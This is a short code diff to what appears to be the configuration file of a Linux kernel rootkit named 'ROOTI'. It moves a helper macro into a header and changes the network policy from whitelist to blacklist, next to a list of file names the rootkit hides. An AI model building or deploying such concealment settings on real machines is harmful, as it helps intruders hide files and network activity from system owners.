@@ -1,13 +1,6 @@
 #include <linux/in.h>
+#include "utils.h"
 #include "config.h"
-
-/*
-    Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the calculation
-    to a constant variable because the linux macro includes some magic __must_be_array() term to catch invalid use
-    of the macro, thus making the expression not constant.
-*/
-#define CONST_ARRAY_SIZE(ARR) sizeof(ARR) / sizeof(ARR[0])
-#define DECLARE_ARRAY_SIZE(ARR) const size_t ARR##_COUNT = CONST_ARRAY_SIZE(ARR)
 
 const char *ROOTI_HIDDEN_FILES[] = {"hideme.txt", "dontshowme.txt"};
 DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES);
@@ -78,7 +71,7 @@ static struct rooti_net_rule ROOTI_NET_RULES[] = {
 };
 
 const struct rooti_net_policy ROOTI_NET_POLICY = {
-    .type = ROOTI_NET_POLICY_WHITELIST,
+    .type = ROOTI_NET_POLICY_BLACKLIST,
     .rules = ROOTI_NET_RULES,
     .len = ARRAY_SIZE(ROOTI_NET_RULES)
 };
